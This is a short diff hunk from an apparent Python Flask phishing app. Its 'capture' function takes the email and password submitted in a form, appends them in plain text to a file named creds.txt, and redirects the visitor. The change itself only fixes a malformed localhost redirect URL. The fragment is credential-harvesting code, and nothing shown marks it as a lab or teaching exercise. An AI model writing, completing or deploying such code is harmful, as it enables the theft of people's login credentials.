@@ -13,7 +13,7 @@ def capture():
     password = request.form.get("password")
     with open("creds.txt", "a") as f:
         f.write(f"Email: {email}, Password: {password}\\n")
-    return redirect("http://localhost8125")
+    return redirect("http://localhost:8125")
    
 
 if __name__ == "__main__":
